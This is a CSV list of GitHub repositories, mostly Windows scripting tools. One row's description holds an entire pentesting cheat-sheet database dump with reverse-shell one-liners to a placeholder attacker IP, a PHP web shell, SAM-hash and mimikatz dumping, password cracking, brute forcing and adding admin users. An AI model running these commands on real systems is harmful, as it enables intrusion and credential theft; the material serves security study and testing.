name,url,description,stars,forks,language,created_at,updated_at
boxcutter/windows-batch,https://github.com/boxcutter/windows-batch,Virtual machine templates for Windows written in legacy JSON and Batch Scripting/JScript,770,262,Ruby,2015-02-13T03:29:15Z,2026-07-11T12:44:58Z
cjee21/Check-UEFISecureBootVariables,https://github.com/cjee21/Check-UEFISecureBootVariables,"PowerShell scripts to check the UEFI KEK, DB and DBX Secure Boot variables as well as scripts for other Secure Boot related items.",305,20,PowerShell,2024-02-14T08:44:04Z,2026-07-31T21:31:42Z
iKineticate/LinkEcho,https://github.com/iKineticate/LinkEcho,"随心批量更换/恢复快捷方式图标，个性化自定义图标设计 ( Batch replace/restore shortcuts icons as you wish,  personalized custom icon design)",296,10,Rust,2024-04-16T12:05:13Z,2026-08-03T10:31:11Z
Alos21750/JableTV-MissAV-Downloader-GUI-2026,https://github.com/Alos21750/JableTV-MissAV-Downloader-GUI-2026,"JableTV, MissAV & SupJav GUI downloader for Windows — browse, batch download, monitor categories, and create AI subtitles (日本語 / English / 繁體中文). Japanese speech is transcribed locally with whisper.cpp; video/audio stay on your PC.",270,38,Python,2026-04-15T09:44:24Z,2026-08-04T07:58:23Z
Ivan-Ayub97/Warlock-Studio,https://github.com/Ivan-Ayub97/Warlock-Studio,"Suite for Windows with Real-ESRGAN, RealESRNet, RealESRAnime, BSRGAN , IRCNN, GFPGAN & RIFE. Upscaling, face restoration, frame interpolation, denoising, batch processing & GPU acceleration in one tool.",228,20,Python,2025-05-17T06:59:10Z,2026-07-30T13:18:58Z
freshe/poddl,https://github.com/freshe/poddl,Podcast Downloader - Download all podcasts / episodes from an RSS-feed,199,19,C++,2019-04-16T11:08:08Z,2026-07-27T13:56:45Z
DosX-dev/BatchToApp,https://github.com/DosX-dev/BatchToApp,Convert your .bat/.cmd scripts to .exe and protect (obfuscate) them with BatchToApp!,167,9,Visual Basic .NET,2024-06-17T20:41:59Z,2026-06-12T18:06:46Z
GChuf/RCWM,https://github.com/GChuf/RCWM,"Right Click Windows Magic is an open-source set of right-click (context) menu tools for admins, power users and other magic beings. Batch&Powershell.",165,8,PowerShell,2020-08-15T12:56:11Z,2026-07-24T07:45:39Z
ricardorodrigues-ca/zoom-recording-downloader,https://github.com/ricardorodrigues-ca/zoom-recording-downloader,Downloads and organizes all cloud recordings from your Zoom Business account,161,85,Python,2020-04-26T04:57:53Z,2026-08-03T12:53:32Z
Don-No7/Hack-SQL,https://github.com/Don-No7/Hack-SQL,"-- -- File generated with SQLiteStudio v3.2.1 on Sun Feb 7 14:58:28 2021 -- -- Text encoding used: System -- PRAGMA foreign_keys = off; BEGIN TRANSACTION;  -- Table: Commands CREATE TABLE Commands (Command_No INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, Name TEXT REFERENCES Programs (Name) NOT NULL, Description TEXT NOT NULL, Command TEXT, File BLOB); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (1, 'Kerbrute', 'brute single user password', 'kerbrute bruteuers [flags]', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (2, 'Kerbrute', 'brute username:password combos from file or stdin', 'kerbrute brutforce [flags]', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (3, 'Kerbrute', 'test a single password agains a list of users', 'kerbrute passwordspray [flags]', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (4, 'Kerbrute', 'Enumerate valid domain usernames via kerberos', 'kerbrute userenum [flags]', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (5, 'Name-That-Hash', 'Find the hash type of a string', 'nth --text ''<hash>''', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (6, 'Name-That-Hash', 'Find the hash type of a file', 'nth --file <hash file>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (7, 'Nmap', 'scan for vulnerabilites', 'nmap --script vuln <HOST_IP>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (8, 'Nikto', 'Scan host for vulnerabilites', 'nikto -h <HOST_IP>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (9, 'SMBClient', 'check for misconfigured anonymous login', 'smbclient -L \\\\<HOST_IP>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (10, 'Hydra', 'Brutforce a webpage looking for usernames', 'hydra -l <user wordlist> -p 123 <HOST_IP> http-post-form ''/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=<output string on failure>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (11, 'SMBMap', 'enumerates SMB file shares', 'smbmap -u <user> -p <pass> -H <host IP>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (12, 'WPScan', 'Enumerate Wordpress website', 'wpscan --url <wp site> --enumerate --plugins-detection', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (13, 'WPScan', 'enumerate though known usernames', 'wpscan --url <HOST_IP> --usernames <USERNAME_FOUND> --passwords wordlist.dic', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (14, 'PowerShell', 'bypass execution policy', 'powershell.exe -exec bypass', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (15, 'TheHarvester', 'gathering informaiton from online sources', 'theharvester -d <domain> -l <#> -g -b google', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (16, 'Netcat', 'open a listener', 'nc -lvnp <port #>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (17, 'Netcat', 'Connect to computer', 'nc <attacker ip> <attacker port>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (18, 'GoBuster', 'Eunmerate directories on a website with a cookie', 'gobuster dir -u http://<IP> -w <wordlist> -x <extention> -c PHPSESSID=<cookie val>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (19, 'SQLMap', 'map sql at an IP', 'sqlmap -r <IP> --batch --force-ssl', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (20, 'John the Ripper', 'Use wordlist to parse hash', 'john <HASHES_FILE> --wordlist=<wordlist>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (21, 'John the Ripper', 'unencrypt shadow file', 'john <Unshadowed passwds>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (22, 'Unshadow', 'combine /etc/passwd and /etc/shadow file for cracking', 'unshadow <passwd> <shadow>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (23, 'Hashcat', 'crack hashes with a wordlist', 'hashcat -m <hash type> -a 0 -o <output file> <hash file> <wordlist> --force', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (26, 'Enum4Linux', 'basic command', 'enum4linux -a <IP>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (27, 'SMBClient', 'connect to a SMB share', 'smbclinet //<IP>/<share> -U <username>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (28, 'Netcat', 'connect with shell (-e doest always work)', 'nc -e /bin/sh <ATTACKING-IP> 80', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (29, 'Netcat', 'connect with shell (-e doest always work)', '/bin/sh | nc ATTACKING-IP 80', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (30, 'Netcat', 'done on the target', 'rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (31, 'SQLMap', 'Check form for SQL injection', 'sqlmap -o -u ""http://meh.com/form/"" –forms', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (32, 'SQLMap', 'automated SQL scan', 'sqlmap -u <URL> --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (33, 'CrackMapExec', 'run a mimikatz module', 'crackmapexec smb <target(s)> -u <username> -p <password> --local-auth -M mimikatz', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (34, 'CrackMapExec', 'Command execution', 'crackmapexec smb <target(s)> -u ''<username>'' -p ''<password>'' -x whoami', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (35, 'CrackMapExec', 'check logged in users', 'crackmapexec smb <target(s)> -u ''<username>'' -p ''<password>'' --lusers', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (36, 'CrackMapExec', 'dump local SAM hashes', 'crackmapexec <target(s)> -u ''<uesrname>'' -p ''<password>'' --local-auth --sam', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (37, 'CrackMapExec', 'null session login', 'crackmapexec smb <target(s)> -u '''' -p ''''', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (38, 'CrackMapExec', 'list modules', NULL, NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (39, 'CrackMapExec', 'pass the hash', NULL, NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (41, 'IKE-Scan', 'attack pre shared key with dictionary', 'psk-crack -d </path/to/dictionary> <psk file>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (42, 'IKE-Scan', 'If you find a SonicWALL VPN using agressive mode it will require a group id, the default group id is GroupVPN', 'ike-scan <IP> -A -id GroupVPN', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (43, 'IKE-Scan', 'to find aggressive mode VPNs and save for use with psk-crack', 'ike-scan <IP> -A -P<file out>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (44, 'John the Ripper', 'crack passwords with korelogic rules', 'for ruleset in `grep KoreLogicRules john.conf | cut -d: -f 2 | cut -d\] -f 1`; do ./john --rules:${ruleset} -w:<wordlist> <password_file> ; done', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (45, 'Nmap', 'create a list of ip addresses ', 'nmap -sL -n 192.168.1.1-100,102-254 | grep ""report for"" | cut -d "" "" -f 5 > ip_list_192.168.1.txt', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (46, 'Linux commands', 'mount NFS share on linux', 'mount -t nfs server:/share /mnt/point', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (47, 'PowerShell', 'create new user', 'net user <username> <password> /ADD', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (48, 'PowerShell', 'add user to a group (normaly Administrators)', 'net localgroup <group> <username> /ADD', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (49, 'PSK-Crack', 'brute force with specified length and specified chars (if left blank default is 36)', 'psk-crack -b <#> --charset=""<charlist>"" <key file>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (50, 'PSK-Crack', 'dictianary attack', 'psk-crack -d <file> <key file>', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (51, 'SQLMap', 'check form for SQL injection', 'sqlmap -o -u ""<url of form>"" --forms', NULL); INSERT INTO Commands (Command_No, Name, Description, Command, File) VALUES (52, 'SQLMap', 'Scan url for union + error based injection with mysql backend and use a random user agent + database dump', 'sqlmap -u ""<form URL>?id=1>""  --dbms=mysql --tech=U --random-agent --dump ', NULL);  -- Table: Exploits CREATE TABLE Exploits (Target TEXT, Type TEXT, Criteria TEXT, Method TEXT, Code TEXT, Result TEXT, Notes TEXT); INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('Website', 'Injection', 'ability to write to website folder', 'create or edit a mage of the website and insert the code to get remote access to the machine', '<? php system ($ _ GET [''cmd'']); ?>', 'execute code via url', '<URL of php>?cmd=<code to execue>'); INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('Linux', 'Priv Enum', 'shell', 'enter code into the shell to find vulnerbilities int he machine', 'find / -perm -u=s -type f 2>/dev/null', 'SUID binaries', 'link output to GTFO bins and exploit'); INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('Box', 'Priv Esc', 'Python binary running as root', 'generate a shell using python to grain root access', 'python3 -c ""import pty;pty.spawn(''/bin/sh'');""', 'root shell', 'change pyton varibale acordingly'); INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('SQL', 'Priv Esc', 'MySQL binary running as root', 'enter into MySQL command line and break out into root y using the code', 'mysql> \! /bin/sh', 'get shell from root priv SQL', NULL); INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('Linux', 'Priv Enum', 'low privilage shell', 'use the code to search for programs that run as sudo without password', 'sudo -l', NULL, 'list programs that can be used with sudo and no password'); INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('Windows', 'Priv Esc', 'Powershell', 'use code to enumerate priv esc opertunities', 'wmic service get name,displayname,pathname,startmode |findstr /i ""auto"" |findstr /i /v ""c:\windows\\"" |findstr /i /v """"""', 'list of unquoted service paths that might be used for priv esc', NULL); INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('Website', 'LFI', NULL, NULL, NULL, NULL, NULL); INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('Linux', 'Priv Enum', NULL, 'use Linenum.sh to enumerate linux box', 'wget https://www.linenum.sh/ -P /dev/shm/Linenum.sh; chmod +x /dev/shm/linenum.sh ; ./dev/shm/Linenum.sh | tee /dev/shm/lininfo.txt', ' file, /dev/shm/lininfo.txt, with priv esc info', 'it is possible to use other methods of download like: curl or others found on google'); INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('Website', 'No-Auth', NULL, NULL, NULL, NULL, NULL); INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('Website', 'Re-Registration', NULL, NULL, NULL, NULL, NULL); INSERT INTO Exploits (Target, Type, Criteria, Method, Code, Result, Notes) VALUES ('Website', 'JWT', 'a site that uses jSON as cookies', 'edit the information (with BURP) thats going to the website to gain access without authenitaction', NULL, NULL, NULL);  -- Table: Programs CREATE TABLE Programs (Name text PRIMARY KEY NOT NULL UNIQUE, Stage TEXT, Description text, Info text, Features TEXT, Target TEXT, Offensive BOOLEAN, commands TEXT); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Nmap', 'Enum', 'Used for scanning a network/host to gather more information', 'man pages on linux', 'Scanning', 'All', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('BURP Suit', 'Enum, Exploit', 'A program for manipulating HTTP requests, enumeration and Exploit', 'https://portswigger.net/burp/documentation/contents', 'Brute', 'Web', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Metasploit', 'All', 'Powerfull swiss-army-knife of hacking', 'https://docs.rapid7.com/metasploit/', NULL, 'All', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('MSFVenom', 'Exploit', 'Designed for creating payloads', 'https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom', 'Payloads', 'OS', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Snort', 'Utility', 'Packet sniffer', 'https://snort-org-site.s3.amazonaws.com/production/document_files/files/000/000/249/original/snort_manual.pdf?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIXACIED2SPMSC7GA%2F20210128%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20210128T192737Z&X-Amz-Expires=172800&X-Amz-SignedHeaders=host&X-Amz-Signature=4b51dc730677d14203c4a4cde25c1831ac64e9eca8df89c6737701811fa3f9fd', 'Sniffing', 'N/A', 'N', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('GoBuster', 'Enum', 'A fuzzer for websites', 'man pages on linux', 'Fuzzing', 'Web', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Hydra', 'Exploit', 'Brutforcer for wesite passwords', 'man pages on linux', 'Brute', 'Web', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Mimikatz', 'Post', 'Used to exploit kerberos', 'https://gist.github.com/insi2304/484a4e92941b437bad961fcacda82d49', NULL, 'Windows', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Impacket', 'Exploit', 'The fascilitator of python bassed script that uses modules for attacking windows ', 'https://www.secureauth.com/labs-old/impacket/', NULL, 'Windows', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Enum4Linux', 'Enum', 'for Enumerating Windows and Samba hosts', 'man pages included, https://tools.kali.org/information-gathering/enum4linux', 'Exploit Enum', 'Linux', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Rubeus', 'Exploit', 'Used for kerberos interaction and abuse', 'https://github.com/GhostPack/Rubeus', NULL, 'Windows', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Kerbrute', 'Enum, Exploit', 'quickly enumerate and brutforce active directory accounts through kerberos pre-authentication', 'https://github.com/ropnop/kerbrute/', 'Brute', 'Windows', 'Y', 'y'); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('John the Ripper', 'Exploit', 'a password brutforcer', 'https://www.openwall.com/john/doc/', 'Brute', 'Hash', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Hashcat', 'Exploit', 'A password bruteforces', 'http://manpages.org/hashcat', 'Brute', 'Hash', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Bloodhound', 'Enum', 'Network mapping tool', 'https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux', NULL, 'N/A', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Wireshark', 'Utility', 'Packet sniffer', 'https://www.wireshark.org/download/docs/user-guide.pdf', 'Sniffing', 'N/A', 'N', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Hash-Identifier', 'Utility', '(superseeded by Name-That-Hash)A simple python program for identifying hashes', 'man pages on linux', NULL, 'Hash', 'N', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Scp', 'Utility', 'For transfering files over SSH connection', 'man pages on llinux', 'Connect', 'N/A', 'N', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('SMBClient', 'Utility', 'Used to connect to SMB file shares, can be used to enumerate shares', 'man pages on linux', 'Connect', 'SMB', 'N', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('PowerShell', 'Utility', 'Powerfull comand line for Windows', 'https://www.pdq.com/powershell/', NULL, 'Windows', 'N', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Searchsploit', 'Enum', 'Local version of ExploitDB', 'https://www.exploit-db.com/searchsploit', 'Exploit Enum', 'All', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Vim', 'Utiility', 'Text editor', 'https://vimhelp.org/', NULL, 'N/A', 'N', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('LinPeas', 'Post', 'For Enumerating Linux computers', 'Simply run on a linux computer', 'Exploit Enum', 'Linux', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Nikto', 'Enum', 'For full enumeration on websites', 'https://cirt.net/nikto2-docs/', 'Exploit Enum', 'Web', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Radare2', 'Utility', 'A tooll used to reverse engineer programs', 'https://github.com/radareorg/radare2/blob/master/doc/intro.md', 'Reverse', 'N/A', 'N', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Evil-WinRM', 'Exploit', 'Malware exuivilent of WinRM and used to exploit windows systems', 'https://github.com/Hackplayers/evil-winrm', NULL, 'Windows', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Seatbelt', 'Post', 'Seatbelt is a C# project that performs a number of security oriented host-survey ""safety checks"" relevant from both offensive and defensive security perspectives', 'https://github.com/GhostPack/Seatbelt', 'Exploit Enum', 'Windows', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('WinPeas', 'Post', 'For full enumeration of windows host (internal)', 'https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS', 'Exploit Enum', 'Windows', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Lockless', 'Post', 'LockLess is a C# tool that allows for the enumeration of open file handles and the copying of locked files', 'https://github.com/GhostPack/Lockless', 'File interaction', 'Windows', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('SQLMap', 'Exploit', 'Automates the process of detecting and exploiting SQL injection flaws and taking over of database servers', 'http://sqlmap.org/', 'SQLi', 'SQL', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('KEETheif', 'Post', 'Allows for the extraction of KeePass 2.X key material from memory, as well as the backdooring and enumeration of the KeePass trigger system', 'https://github.com/GhostPack/KeeThief', 'File interacction', 'Windows', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('TheHarvester', 'Enum', 'The objective of this program is to gather emails, subdomains, hosts, employee names, open ports and banners from different public sources like search engines, PGP key servers and SHODAN computer database', 'https://tools.kali.org/information-gathering/theharvester', NULL, 'N/A', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('jSQLInjection', 'Enum', 'used for gathering SQL databse information form a distant source', 'https://tools.kali.org/vulnerability-analysis/jsql', 'SQLi', 'SQL', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Hping', 'Enum', 'Ping command on steroids, used to enumerating firewalls', 'https://tools.kali.org/information-gathering/hping3', 'Scanning', 'All', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Linux Exploit Suggester', 'Post', 'keeps track of vulnerabilities and suggests exploits to gain root access', 'https://tools.kali.org/exploitation-tools/linux-exploit-suggester', 'Exploit Enum', 'Linux', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Unix-PrivEsc-Check', 'Post', ' It tries to find misconfigurations that could allow local unprivileged users to escalate privileges to other users or to access local apps, written in a single shell script so is easy to upload', 'https://tools.kali.org/vulnerability-analysis/unix-privesc-check', 'Exploit Enum', 'Linux', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Dotdotpwn', 'Enum', 'It’s a very flexible intelligent fuzzer to discover traversal directory vulnerabilities in software such as HTTP/FTP/TFTP servers', 'https://tools.kali.org/information-gathering/dotdotpwn', 'Fuzzing', 'Web', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Websploit', 'Enum, Exploit', 'Swiss-army-knife of web exploits ranging from social engineering to honeypots and everything in between', 'https://tools.kali.org/web-applications/websploit', NULL, 'Web', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('XSSer', 'Enum', 'To detect, exploit and report XSS vulnerabilities in web-based applications', 'https://tools.kali.org/web-applications/xsser', 'Exploit enum', 'Web', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Name-That-Hash', 'Utility', 'Hash-identifier with more deatils and command line based', 'https://github.com/HashPals/Name-That-Hash', NULL, 'N/A', 'N', 'y'); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('SMBMap', 'Enum', 'enumerate shares over a domin', 'https://tools.kali.org/information-gathering/smbmap', 'Scanning', 'OS', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Redis-Cli', 'Exploit', 'used for interacting and exploiting reddis-cli on port 6379', 'https://book.hacktricks.xyz/pentesting/6379-pentesting-redis ; https://redis.io/topics/rediscli', 'SQL', 'SQL', 'N', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Unshadow', 'POST', 'Combining passwd and shadow files into 1', 'simply use: unshadow <passwd file> <shadow file> > <output file>', 'Passwords', 'Hash', 'Y', 'y'); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('WPScan', 'Enum', 'Look for vulnerabilities in wordpress site', 'https://github.com/wpscanteam/wpscan', 'Scanning', 'Web', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Netcat', 'Utility', 'used for connecting 2 computers', 'https://www.win.tue.nl/~aeb/linux/hh/netcat_tutorial.pdf', 'Connect', 'N/A', 'N', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('Linux commands', 'Post', 'Linux commands used for Priv esc', 'https://gtfobins.github.io, https://wadcoms.github.io', 'Priv Esc', 'Linux', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('CrackMapExec', 'Enum,, Exploit', 'Swis army knife of network testing', 'https://ptestmethod.readthedocs.io/en/latest/cme.html', 'Scanning, Exploit', 'Networks', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('IKE-Scan', 'Enum', 'Used to dicover, fingerprint and test IPsec VPN systems', 'http://www.nta-monitor.com/wiki/index.php/Ike-scan_User_Guide', 'Scanning', 'VPN', NULL, NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('PSK-Crack', 'Exploit', 'attempts to crack IKE Aggressive Mode pre-shared keys that have previously been gathered using ike-scan with the --pskcrack option', 'https://linux.die.net/man/1/psk-crack', 'Connect, Brute', 'Wifi', 'Y', NULL); INSERT INTO Programs (Name, Stage, Description, Info, Features, Target, Offensive, commands) VALUES ('CeWL', 'Enum', 'spiders a given url returning a wordlist that is intednded for cracking passwords', 'https://tools.kali.org/password-attacks/cewl', 'Brute', 'Web', 'Y', NULL);  COMMIT TRANSACTION; PRAGMA foreign_keys = on;",142,24,,2022-01-30T17:26:02Z,2026-07-20T07:59:17Z
RedGreenBlue09/WFAv7_Installer,https://github.com/RedGreenBlue09/WFAv7_Installer,Batch script to install Windows 10 ARM desktop version to Lumia devices (dual boot & single boot).,136,15,Shell,2020-03-13T04:24:55Z,2026-08-02T01:02:46Z
slyfox1186/script-repo,https://github.com/slyfox1186/script-repo,My personal script repository with multiple languages supported. AHK v1+v2 | BASH | BATCH | JSON | PERL | POWERSHELL | PYTHON | WINDOWS REGISTRY | XML,135,16,Shell,2022-12-24T16:16:44Z,2026-07-29T15:01:56Z
iKineticate/AHK-ChangeIcon,https://github.com/iKineticate/AHK-ChangeIcon,"只需一步操作，用户即可随心批量更换/恢复快捷方式图标 ( With just one step, users can change or restore the icons of shortcuts in batches as they wish )",131,1,AutoHotkey,2023-09-22T06:43:29Z,2026-08-03T10:31:03Z
fpoussin/Qt5-MSVC-Static,https://github.com/fpoussin/Qt5-MSVC-Static,Batch scripts that download and build static Qt5 libs on Windows.,117,54,M4,2015-07-23T21:41:20Z,2026-05-13T12:59:08Z
daboynb/windows_scripts,https://github.com/daboynb/windows_scripts,Collection of useful automation scripts for Windows,117,20,PowerShell,2022-10-10T11:54:49Z,2026-07-27T14:12:16Z
canarddu38/DUCKSPLOIT,https://github.com/canarddu38/DUCKSPLOIT,Windows Hacking FrameWork using Reverse Shell,111,17,C#,2022-01-20T20:59:25Z,2026-06-29T23:41:59Z
ComPDFKit/compdfkit-conversion-sdk-windows,https://github.com/ComPDFKit/compdfkit-conversion-sdk-windows,"High-performance PDF conversion library for Windows desktop apps. Convert PDF to Word, Excel, PPT, HTML, CSV, images, text, RTF, searchable PDF, JSON, Markdown, and OFD while preserving original layout with pixel-perfect accuracy. Support OCR, AI table recognition, and batch processing.",109,10,HTML,2025-06-09T07:53:32Z,2026-07-01T03:20:31Z
jeremyben/thebatchman,https://github.com/jeremyben/thebatchman,Converts Windows batch scripts (or HTA) into executable files,97,20,JavaScript,2015-12-27T22:57:42Z,2026-07-10T13:47:22Z
hahndorf/Set-Privacy,https://github.com/hahndorf/Set-Privacy,PowerShell script to batch-change privacy settings in Windows 10,95,19,PowerShell,2015-08-04T03:02:20Z,2025-04-05T09:01:17Z
Scrut1ny/Windows-MAC-Address-Spoofer,https://github.com/Scrut1ny/Windows-MAC-Address-Spoofer,#1 Fully featured automated batchfile MAC address spoofer!,93,15,PowerShell,2021-12-22T01:10:02Z,2026-07-23T17:49:52Z
